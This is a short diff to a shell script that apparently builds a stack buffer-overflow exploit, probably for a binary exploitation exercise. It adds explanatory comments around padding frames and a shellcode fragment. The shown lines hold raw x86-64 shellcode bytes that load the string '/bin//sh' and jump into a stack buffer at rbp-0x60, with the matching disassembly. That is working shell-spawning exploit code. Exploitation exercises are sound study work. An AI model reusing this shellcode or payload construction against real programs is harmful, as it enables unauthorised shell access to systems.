@@ -13,6 +13,7 @@ fi
 Illustration
 
 
+# 20 bytes a frame
 frame="\x0c\x87\x63"$(printf "\x01%.0s" $(seq 1 17))
 
 
@@ -39,7 +40,7 @@ fill2=$(printf "\x01%.0s" $(seq 17 19))$frame$frame"\x0c\x87\x63\x01"
 # 64 ~ 79th bytes
 shellcode_part2="\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x8d\x45\xa0\xff\xe0"
 : << Instruction
-48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f
+48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f  # encoded from "/bin//sh"
 2f 73 68
 48 8d 45 a0             lea    rax,[rbp-0x60]
 ff e0                   jmp    rax  # jump to buf[128]
